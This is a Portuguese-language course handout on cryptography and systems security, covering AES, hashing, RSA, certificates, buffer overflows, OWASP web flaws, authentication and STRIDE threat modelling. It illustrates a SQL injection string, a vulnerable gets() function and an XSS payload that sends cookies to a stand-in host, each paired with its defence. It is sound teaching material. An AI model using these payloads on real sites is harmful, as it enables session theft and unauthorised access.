# Segurança e Criptografia: Apostila Prática

Roadmap Ciência da Computação · Semanas 107 e 108

## Comece por aqui

Segurança é diferente de quase toda a computação: em vez de usuários que querem que o sistema funcione, há um **adversário inteligente** que procura o ponto mais fraco, e basta **um** erro para ele vencer. Esta etapa curta tem duas partes: a **criptografia**, a matemática que protege dados (com a teoria dos números da Matemática Discreta e a probabilidade), e a **segurança de sistemas**, as falhas reais em programas, na web e na autenticação (usando o que você aprendeu em Arquitetura, Sistemas Operacionais, Redes e Bancos de Dados). Ela não forma um especialista, mas ensina o que **todo** profissional de computação precisa saber para não ser o elo fraco.

> **Aviso:** pratique ataques **só** em ambientes feitos para isso (laboratórios, CTFs, máquinas suas). Invadir sistemas de terceiros sem autorização é crime no Brasil (Lei 12.737/2012) e em quase todo o mundo.

### Equivalências

| Universidade | Disciplina |
|---|---|
| ITA | CTC-42 Introdução à Criptografia; CSC-07 Fundamentos de Segurança Cibernética |
| MIT | 6.5660 (antiga 6.858) Computer Systems Security; 6.1600 Foundations of Computer Security |
| Harvard | CS 1260 Fundamentals of Cryptography |
| Oxford | Computer Security (3º ano) |

### Como esta apostila funciona

1. Use Python para os exemplos de criptografia, mas **nunca** use em produção a criptografia que você mesmo implementar: use bibliotecas consolidadas (`cryptography`, libsodium).
2. Para segurança de sistemas, use laboratórios intencionalmente vulneráveis: **OWASP Juice Shop**, **PortSwigger Web Security Academy** (gratuito), e desafios de **CTF** (picoCTF).
3. Atividades no fim de cada tema; gabarito na outra aba.

> **Regra dos 20 minutos:** para entender uma falha, pense como o atacante: "o que este código **supõe** sobre a entrada, e o que acontece se a suposição for falsa?". Quase toda vulnerabilidade é uma suposição não verificada.

### Plano de estudo sugerido

| Semana | Tema |
|---|---|
| 107 | Tema 1: Criptografia |
| 108 | Tema 2: Segurança de sistemas + projeto |

## Tema 1: Criptografia

**Objetivo:** entender as ferramentas criptográficas modernas, o que cada uma garante e como usá-las corretamente.

### 1.1 Criptografia simétrica

Objetivos da segurança da informação (a tríade **CIA**): **confidencialidade** (só quem deve lê), **integridade** (ninguém altera sem ser detectado) e **disponibilidade** (o sistema funciona quando precisa). Mais **autenticidade** (saber quem enviou) e **não repúdio** (o autor não pode negar).

**Princípio de Kerckhoffs:** um sistema deve ser seguro mesmo que o adversário conheça **todo** o algoritmo, exceto a **chave**. Algoritmos secretos ("segurança por obscuridade") quase sempre são quebrados; os bons são públicos e analisados por anos.

Na criptografia **simétrica**, a mesma chave cifra e decifra.

- O **one-time pad** (XOR com uma chave aleatória do tamanho da mensagem, usada uma única vez) tem **segurança perfeita** (Shannon, 1949): o texto cifrado não revela nada. Impraticável (a chave é do tamanho dos dados), e reusar a chave destrói tudo: c₁ ⊕ c₂ = m₁ ⊕ m₂.
- **Cifras de bloco** como o **AES** (padrão desde 2001; chaves de 128 ou 256 bits; blocos de 16 bytes) são, na prática, permutações que parecem aleatórias para quem não tem a chave. Testar 2¹²⁸ chaves é impossível com qualquer computador concebível.
- **Cifras de fluxo** como o **ChaCha20** geram um fluxo pseudoaleatório a partir da chave e de um *nonce*, combinado por XOR com a mensagem. Rápida em software (usada em celulares).

**Modos de operação** dizem como cifrar mensagens maiores que um bloco. O ingênuo, **ECB** (cada bloco cifrado independentemente), é **inseguro**: blocos iguais viram blocos cifrados iguais, e padrões aparecem (o famoso "pinguim do Linux cifrado em ECB" continua visível). Use **cifragem autenticada** (**AEAD**): **AES-GCM** ou **ChaCha20-Poly1305**, que garantem confidencialidade **e** integridade ao mesmo tempo.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

chave = AESGCM.generate_key(bit_length=256)
aes = AESGCM(chave)
nonce = os.urandom(12)                         # NUNCA reutilize um nonce com a mesma chave
cifrado = aes.encrypt(nonce, b"saldo: 1000", b"cabecalho-autenticado")
print(aes.decrypt(nonce, cifrado, b"cabecalho-autenticado"))   # falha se algo foi alterado
```

> **Cuidado! Cai na entrevista:** cifrar **sem autenticar** não garante integridade: com cifras de fluxo, inverter um bit do texto cifrado inverte o mesmo bit do texto claro, e um atacante pode trocar "1000" por "9000" sem saber a chave. Por isso use AEAD. E repetir o *nonce* no GCM é catastrófico.

### 1.2 Funções de hash

Uma **função de hash criptográfica** (SHA-256, SHA-3, BLAKE2/3) mapeia dados de qualquer tamanho num resumo de tamanho fixo, com:

- **Resistência à pré-imagem:** dado h, é inviável achar m com hash(m) = h.
- **Resistência à segunda pré-imagem:** dado m, é inviável achar outro m′ com o mesmo hash.
- **Resistência a colisões:** é inviável achar **quaisquer** m ≠ m′ com o mesmo hash. Pelo **paradoxo do aniversário** (Probabilidade), colisões aparecem com ~2^(n/2) tentativas: um hash de 256 bits dá 128 bits de segurança contra colisões.

MD5 e SHA-1 estão **quebrados** para colisões (colisões práticas de SHA-1 foram demonstradas em 2017): não use para segurança.

Usos: verificar integridade de arquivos baixados, identificadores de conteúdo (o Git identifica cada objeto pelo hash), **assinaturas** (assina-se o hash), *blockchains*, **MACs**.

Um **MAC** (código de autenticação de mensagem), como o **HMAC-SHA256**, usa uma chave secreta: só quem tem a chave produz ou verifica a marca. Garante integridade e autenticidade (entre quem compartilha a chave).

**Senhas** não se guardam cifradas nem com hash rápido: use uma função de hash **lenta e com sal** feita para isso: **Argon2id**, **bcrypt** ou **scrypt**. O **sal** (aleatório por usuário) impede tabelas pré-calculadas e faz senhas iguais terem hashes diferentes; a **lentidão** (ajustável) torna a força bruta cara. Um SHA-256 de uma senha comum é quebrado por uma GPU em segundos.

### 1.3 Criptografia assimétrica

Como duas pessoas que nunca se encontraram combinam uma chave secreta por um canal que todos escutam? A **criptografia de chave pública** (Diffie e Hellman, 1976) resolveu: cada pessoa tem um **par** de chaves, uma **pública** (divulgada) e uma **privada** (secreta).

**Troca de chaves Diffie-Hellman:** com um primo p e um gerador g públicos, Alice escolhe a secreta e envia A = gᵃ mod p; Bob escolhe b e envia B = gᵇ mod p. Alice calcula Bᵃ = gᵃᵇ e Bob calcula Aᵇ = gᵃᵇ: o mesmo segredo. Um espião vê g, p, gᵃ e gᵇ, mas calcular gᵃᵇ exige resolver o **logaritmo discreto**, inviável para números grandes.

**RSA** (Matemática Discreta, Tema 5): cifrar com a pública (n, e), decifrar com a privada d; a segurança vem da dificuldade de **fatorar** n.

**Curvas elípticas** (ECC): o mesmo princípio do Diffie-Hellman, com a operação de "somar pontos" numa curva em vez de multiplicar módulo p. Chaves muito menores com a mesma segurança (uma chave de 256 bits de curva elíptica equivale a ~3.072 bits de RSA). X25519 (troca de chaves) e Ed25519 (assinaturas) são as escolhas modernas.

Assimétrica é **lenta** (centenas a milhares de vezes mais que a simétrica). Na prática, usa-se **criptografia híbrida**: a assimétrica combina uma **chave de sessão** aleatória, e a simétrica (AES ou ChaCha20) cifra os dados. É o que o TLS faz (Redes).

> **Cuidado! Cai na prova:** o RSA "de livro" (m^e mod n direto) é **inseguro**: é determinístico (a mesma mensagem dá sempre o mesmo texto cifrado, então dá para testar palpites) e maleável (multiplicar textos cifrados multiplica as mensagens). Na prática, RSA sempre usa preenchimento aleatório (OAEP para cifrar, PSS para assinar). E computadores quânticos com o algoritmo de Shor (Teoria da Computação) quebrariam RSA e ECC; por isso a migração para algoritmos **pós-quânticos** (ML-KEM e ML-DSA, padronizados pelo NIST em 2024) já começou.

### 1.4 Assinaturas e certificados

Uma **assinatura digital** usa a chave **privada** para assinar e a **pública** para verificar: qualquer um confere que só o dono da chave privada poderia ter assinado, e que a mensagem não mudou. Garante integridade, autenticidade e não repúdio. Usos: atualizações de software, transações, documentos (a ICP-Brasil dá validade jurídica a assinaturas digitais), commits do Git, e o próprio TLS.

Mas como saber que uma chave pública pertence mesmo ao `banco.com.br`, e não a um impostor no meio do caminho (ataque *man-in-the-middle*)? **Certificados**: um documento que liga um nome a uma chave pública, **assinado por uma autoridade certificadora** (CA). Seu navegador confia num conjunto de CAs raiz; elas assinam CAs intermediárias, que assinam os certificados dos sites: a **cadeia de confiança** (a **infraestrutura de chave pública**, PKI).

Fragilidades e defesas: uma CA comprometida pode emitir certificados falsos para qualquer site (já aconteceu, com a DigiNotar em 2011). Defesa: **Certificate Transparency**, logs públicos e auditáveis de todos os certificados emitidos. Certificados expiram e podem ser revogados. O **Let's Encrypt** tornou os certificados gratuitos e automáticos, e hoje a maior parte da web usa HTTPS.

**Gerenciamento de chaves** é a parte difícil na prática: chaves privadas em cofres (HSMs, serviços de nuvem), rotação periódica, nunca no repositório de código.

### Atividades de fixação do Tema 1

1. Mostre que reutilizar a chave do one-time pad vaza informação: cifre duas mensagens com a mesma chave e calcule c₁ ⊕ c₂.
2. Cifre uma imagem simples (um bitmap com áreas de cor uniforme) com AES em modo ECB e em modo CTR. Compare visualmente o resultado.
3. Calcule quanto tempo levaria testar todas as chaves de 56 bits (o antigo DES) e de 128 bits a 10¹² tentativas por segundo.
4. Por que guardar senhas com SHA-256 é ruim, mesmo com sal? Meça quantos hashes SHA-256 e quantos bcrypt (custo 12) seu computador faz por segundo.
5. Faça uma troca de chaves Diffie-Hellman com p = 23, g = 5, a = 6 e b = 15. Qual o segredo comum?
6. Implemente RSA didático com primos pequenos e mostre a maleabilidade: dado o texto cifrado de m, produza o texto cifrado de 2m sem conhecer m.
7. Inspecione a cadeia de certificados de um site com `openssl s_client -connect site:443 -showcerts`. Quais são a raiz, a intermediária e o certificado do site?

## Tema 2: Segurança de sistemas

**Objetivo:** reconhecer e prevenir as vulnerabilidades mais comuns em programas, aplicações web e autenticação, e pensar sistematicamente em ameaças.

### 2.1 Vulnerabilidades de memória

Em C e C++ (Sistemas Operacionais, Tema 1), erros de memória viram brechas:

**Estouro de buffer na pilha:** escrever além do fim de um array local sobrescreve o que vem depois na pilha, inclusive o **endereço de retorno** salvo (Arquitetura, Tema 4). O atacante controla para onde o `ret` salta.

```c
void le_nome(void) {
    char nome[16];
    gets(nome);         // não limita o tamanho: com 100 caracteres, sobrescreve a pilha
}
```

Outras: **uso depois de liberar** (memória liberada é realocada para outro objeto, e o ponteiro antigo passa a ler ou escrever nele), **estouro de inteiro** que leva a alocar pouca memória, **strings de formato** (`printf(entrada_do_usuario)`).

Defesas em camadas, que tornam a exploração muito mais difícil (mas não impossível):

| Defesa | Ideia |
|---|---|
| Canários de pilha | Um valor aleatório antes do endereço de retorno; se mudou, aborta |
| Pilha não executável (NX/DEP) | Dados na pilha não podem ser executados como código |
| ASLR | Endereços aleatórios a cada execução: o atacante não sabe para onde saltar |
| Integridade do fluxo de controle | Saltos só para destinos válidos |
| Funções seguras e *sanitizers* | `fgets`, `snprintf`; ASan nos testes; *fuzzing* |
| **Linguagens seguras em memória** | Rust, Go, Java, Python eliminam a classe inteira de bugs |

Atacantes contornam NX com **programação orientada a retorno** (ROP): encadear pedaços de código que já existem no programa. Por isso a recomendação atual de órgãos como a CISA e a NSA é migrar código crítico para linguagens seguras em memória.

**Fuzzing:** gerar milhões de entradas aleatórias ou mutadas (AFL++, libFuzzer) e observar crashes. É a técnica que mais encontra vulnerabilidades reais hoje.

### 2.2 Segurança web

A lista **OWASP Top 10** resume os riscos mais comuns em aplicações web. Os mais clássicos:

**Injeção de SQL:** montar consultas concatenando texto do usuário.

```python
# VULNERÁVEL: com usuario = "' OR '1'='1' --", a consulta devolve todos os usuários
cursor.execute(f"SELECT * FROM usuarios WHERE nome = '{usuario}' AND senha = '{senha}'")

# CORRETO: consulta parametrizada; o banco trata o valor como dado, nunca como código
cursor.execute("SELECT * FROM usuarios WHERE nome = %s", (usuario,))
```

A mesma ideia vale para comandos do sistema (injeção de comandos), LDAP, e para *prompts* de modelos de linguagem (injeção de *prompt*): **nunca misture código e dados não confiáveis no mesmo texto**.

**XSS** (*cross-site scripting*): a aplicação mostra texto do usuário sem escapar, e um comentário como `<script>fetch('https://mau.com/?c=' + document.cookie)</script>` roda no navegador de **todos** que abrirem a página, roubando sessões. Defesas: **escapar a saída** conforme o contexto (frameworks como React fazem isso por padrão; cuidado com `dangerouslySetInnerHTML`), uma **política de segurança de conteúdo** (CSP), e cookies com `HttpOnly`.

**CSRF** (*cross-site request forgery*): um site malicioso faz o navegador da vítima enviar uma requisição para outro site onde ela está logada (os cookies vão juntos). Defesas: cookies `SameSite`, *tokens* anti-CSRF, exigir confirmação em operações sensíveis.

**Controle de acesso quebrado** (o primeiro da lista atual): o servidor não confere se o usuário **pode** acessar o recurso. Trocar `/pedidos/1001` por `/pedidos/1002` na URL e ver o pedido de outra pessoa (IDOR). Toda verificação de permissão tem que ser feita **no servidor**, a cada requisição; esconder o botão na interface não protege nada.

Outros: **SSRF** (fazer o servidor buscar URLs internas), **desserialização insegura**, configurações padrão inseguras, **componentes com vulnerabilidades conhecidas** (dependências desatualizadas: o caso Log4Shell, em 2021, afetou milhões de sistemas), e falta de registro e monitoramento.

Princípio geral: **toda entrada é hostil até ser validada**, e validar significa usar listas do que é **permitido**, não do que é proibido.

### 2.3 Autenticação

**Autenticação** é provar quem você é; **autorização** é decidir o que você pode fazer.

Fatores: algo que você **sabe** (senha), algo que você **tem** (celular, chave física), algo que você **é** (biometria). **Autenticação multifator** (MFA) combina dois ou mais, e bloqueia a enorme maioria dos ataques a contas.

Boas práticas com senhas (recomendações atuais do NIST):

- Guarde com Argon2id ou bcrypt (Tema 1).
- Exija tamanho mínimo (pelo menos 8, melhor 15) e compare com listas de senhas vazadas; **não** exija trocas periódicas nem regras de símbolos obrigatórios (levam a senhas previsíveis como "Senha@2025").
- Limite tentativas (bloqueio progressivo, CAPTCHA) contra força bruta e *credential stuffing* (testar senhas vazadas de outros sites).
- Compare segredos em **tempo constante** (`hmac.compare_digest`), para não vazar informação pelo tempo de resposta.

Além das senhas: **chaves de acesso** (*passkeys*, padrão FIDO2/WebAuthn) usam criptografia de chave pública com a chave privada no dispositivo, e são **resistentes a phishing** (a assinatura vale só para o domínio verdadeiro). Códigos por SMS são o fator mais fraco (sequestro de chip, *SIM swap*).

**Sessões:** depois do login, um identificador de sessão aleatório e longo, em cookie com `Secure`, `HttpOnly` e `SameSite`, regenerado no login e invalidado no logout. **Tokens** (JWT) são comuns em APIs: assinados, com expiração curta, e verificando sempre o algoritmo e a assinatura. Para "entrar com Google", **OAuth 2.0** e **OpenID Connect**.

**Princípio do menor privilégio:** cada usuário, serviço e processo recebe só as permissões de que precisa. O banco de dados da aplicação não roda como administrador; o servidor web não roda como root.

### 2.4 Modelagem de ameaças

Segurança não é uma lista de truques: é pensar **sistematicamente** no que pode dar errado. Quatro perguntas (Adam Shostack):

1. **O que estamos construindo?** (Um diagrama de fluxo de dados, com as **fronteiras de confiança**: onde dados passam de uma zona para outra, como da internet para o servidor.)
2. **O que pode dar errado?** O método **STRIDE** ajuda a lembrar as categorias:

| Ameaça | Viola | Exemplo |
|---|---|---|
| **S**poofing (falsificação de identidade) | Autenticidade | Roubar a sessão de outro usuário |
| **T**ampering (adulteração) | Integridade | Alterar o preço no pedido enviado pelo navegador |
| **R**epudiation (repúdio) | Não repúdio | Negar ter feito uma transferência, sem registro para provar |
| **I**nformation disclosure (vazamento) | Confidencialidade | Mensagem de erro mostrando a consulta SQL e dados |
| **D**enial of service (negação de serviço) | Disponibilidade | Inundar o login com requisições |
| **E**levation of privilege (elevação de privilégio) | Autorização | Usuário comum acessando a área de administração |

3. **O que vamos fazer a respeito?** Para cada ameaça: mitigar, eliminar (remover a funcionalidade), transferir (seguro, terceiros) ou aceitar conscientemente.
4. **Fizemos um bom trabalho?** Revisar, testar (testes de intrusão, *bug bounty*), monitorar.

Princípios de projeto seguro (Saltzer e Schroeder, 1975, ainda atuais): **menor privilégio**, **padrões seguros** (negar por padrão), **defesa em profundidade** (várias camadas, nenhuma confiável sozinha), **mecanismo simples** (complexidade esconde falhas), **mediação completa** (verificar toda requisição, não só a primeira), **projeto aberto** (Kerckhoffs) e **aceitabilidade psicológica** (segurança que atrapalha demais é contornada pelos usuários).

O fator humano é o vetor mais explorado: **phishing** e engenharia social. Treinamento ajuda, mas defesas técnicas (MFA resistente a phishing, filtros, menor privilégio) ajudam mais.

### Atividades de fixação do Tema 2

1. Troque o `gets` do exemplo por `scanf("%s", nome)`, compile com `-fsanitize=address -g` e entre com um nome de 100 caracteres. Leia o relatório do AddressSanitizer. Depois corrija com `fgets` e confirme que o erro some. Explique também, em palavras, o que o canário de pilha e o ASLR fazem para dificultar a exploração desse tipo de erro.
2. No PortSwigger Web Security Academy, resolva os laboratórios introdutórios de injeção de SQL (inclusive o que contorna o login) e explique a correção.
3. Encontre um XSS armazenado no OWASP Juice Shop. Por que o React, por padrão, protege contra a maior parte dos XSS?
4. Uma API tem `GET /api/faturas/{id}` que devolve a fatura se o usuário estiver logado. Que vulnerabilidade pode existir? Escreva um teste automatizado que a detecte.
5. Revise uma tela de login com: mensagem "senha incorreta para o usuário ana@x.com", sem limite de tentativas, senha guardada em MD5, e sessão num cookie sem `HttpOnly`. Liste os problemas e as correções.
6. Faça a modelagem de ameaças (diagrama com fronteiras de confiança e uma tabela STRIDE com pelo menos 8 ameaças e mitigações) do sistema de agendamento da clínica da etapa de Engenharia de Software.

## Projeto da etapa

**RSA didático e laboratório de segurança web:**

1. **RSA do zero** em Python: geração de primos grandes com Miller-Rabin, geração de chaves, cifrar e decifrar, assinar e verificar (sobre o hash SHA-256 da mensagem).
2. **Por que não usar em produção:** demonstre, com código, três ataques ao seu RSA "de livro": (a) a mensagem pequena com e = 3 que pode ser decifrada com raiz cúbica; (b) a maleabilidade; (c) adivinhar mensagens de um conjunto pequeno (o determinismo). Depois mostre como a biblioteca `cryptography` com OAEP evita isso. Discuta também ataques de canal lateral (tempo).
3. **Laboratório web:** suba o OWASP Juice Shop num container e explore pelo menos 6 desafios cobrindo injeção, XSS, controle de acesso quebrado, autenticação e exposição de dados. Para cada um: como encontrou, o impacto, e como corrigiria no código.
4. **Relatório** no formato de um relatório de teste de intrusão: resumo executivo, vulnerabilidades por gravidade (use a escala CVSS), evidências e recomendações.

## Para ir além

- *Serious Cryptography* (Jean-Philippe Aumasson) e *Cryptography Engineering* (Ferguson, Schneier e Kohno).
- O curso **Cryptography I** de Dan Boneh (Stanford, gratuito no Coursera) e *A Graduate Course in Applied Cryptography* (Boneh e Shoup, gratuito).
- **MIT 6.858** no OpenCourseWare: aulas e laboratórios de segurança de sistemas.
- **PortSwigger Web Security Academy** e **OWASP** (Top 10, Cheat Sheet Series, Juice Shop), todos gratuitos.
- *Security Engineering* (Ross Anderson, gratuito online): a visão ampla, inclusive dos fatores humanos e econômicos.
- **picoCTF** e **OverTheWire** para praticar com desafios.

## Resumão

- Confidencialidade, integridade, disponibilidade. Kerckhoffs: o segredo é só a chave.
- Simétrica: AES, ChaCha20. Nunca ECB; use AEAD (AES-GCM, ChaCha20-Poly1305) e nunca repita o nonce.
- Hash: pré-imagem, segunda pré-imagem, colisões (2^(n/2) pelo aniversário). MD5 e SHA-1 quebrados. HMAC para autenticar.
- Senhas: Argon2id ou bcrypt, com sal e lentidão. Nunca hash rápido.
- Assimétrica: Diffie-Hellman (logaritmo discreto), RSA (fatoração), curvas elípticas (chaves menores). Na prática, híbrida.
- RSA de livro é inseguro: use OAEP/PSS. Shor quebraria RSA e ECC: pós-quântico a caminho.
- Assinatura: privada assina, pública verifica. Certificados e CAs formam a cadeia de confiança; Certificate Transparency audita.
- Memória: estouro de buffer, uso depois de liberar. Canários, NX, ASLR, fuzzing e linguagens seguras em memória.
- Web: injeção (consultas parametrizadas), XSS (escape de saída, CSP), CSRF (SameSite, tokens), controle de acesso no servidor sempre.
- Autenticação: MFA, passkeys resistentes a phishing, sessões seguras, menor privilégio.
- Modelagem de ameaças: fronteiras de confiança e STRIDE. Defesa em profundidade, padrões seguros, mediação completa.
